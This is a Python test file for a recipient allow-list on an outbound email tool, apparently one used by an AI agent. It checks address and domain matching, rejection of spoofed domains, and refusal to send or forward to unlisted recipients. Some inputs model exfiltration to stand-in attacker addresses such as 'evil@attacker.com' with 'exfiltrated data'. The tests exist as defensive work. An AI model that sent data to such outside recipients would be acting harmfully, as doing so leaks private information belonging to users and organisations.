"""Tests for the outbound email tool recipient allow-list — issue #33."""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock

import pytest

from palmtop.tools.email import EmailTool


class TestRecipientAllowed:
    def test_empty_allowlist_allows_all(self):
        tool = EmailTool("am_x", "inbox_x")
        assert tool._recipient_allowed("anyone@anywhere.com") is True

    def test_exact_address_match(self):
        tool = EmailTool("am_x", "inbox_x", allowed_recipients=["boss@company.com"])
        assert tool._recipient_allowed("boss@company.com") is True
        assert tool._recipient_allowed("BOSS@Company.com") is True  # case-insensitive
        assert tool._recipient_allowed("intruder@company.com") is False

    def test_domain_match(self):
        tool = EmailTool("am_x", "inbox_x", allowed_recipients=["company.com"])
        assert tool._recipient_allowed("anyone@company.com") is True
        assert tool._recipient_allowed("anyone@evil.com") is False

    def test_parses_display_name(self):
        tool = EmailTool("am_x", "inbox_x", allowed_recipients=["company.com"])
        assert tool._recipient_allowed('"The Boss" <boss@company.com>') is True
        assert tool._recipient_allowed('"Spoof" <boss@company.com.evil.com>') is False


def _tool_with_mock_client(allowed):
    tool = EmailTool("am_x", "inbox_x", allowed_recipients=allowed)
    client = MagicMock()
    resp = MagicMock(status_code=200)
    resp.json.return_value = {"message_id": "m1"}
    client.post = AsyncMock(return_value=resp)
    tool._client = client
    return tool, client


class TestSendEnforcement:
    @pytest.mark.asyncio
    async def test_send_blocks_disallowed_recipient(self):
        tool, client = _tool_with_mock_client(["company.com"])
        out = await tool._send("evil@attacker.com | hi | exfiltrated data")
        assert "Refused" in out
        client.post.assert_not_called()

    @pytest.mark.asyncio
    async def test_send_allows_listed_recipient(self):
        tool, client = _tool_with_mock_client(["company.com"])
        out = await tool._send("alice@company.com | hi | hello")
        assert "Sent to" in out
        client.post.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_forward_blocks_disallowed_recipient(self):
        tool, client = _tool_with_mock_client(["company.com"])
        out = await tool._forward("msg_123 | evil@attacker.com")
        assert "Refused" in out
        client.post.assert_not_called()

    @pytest.mark.asyncio
    async def test_empty_allowlist_still_sends(self):
        tool, client = _tool_with_mock_client(None)
        out = await tool._send("anyone@anywhere.com | hi | hello")
        assert "Sent to" in out
        client.post.assert_awaited_once()
